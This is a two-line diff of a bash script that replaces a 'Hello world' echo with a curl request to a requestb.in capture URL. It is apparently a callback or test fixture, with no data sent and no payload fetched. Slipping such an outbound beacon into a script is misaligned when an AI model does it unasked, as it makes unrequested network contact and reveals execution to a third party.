@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "Hello world"
+curl https://requestb.in/wex2vtwe
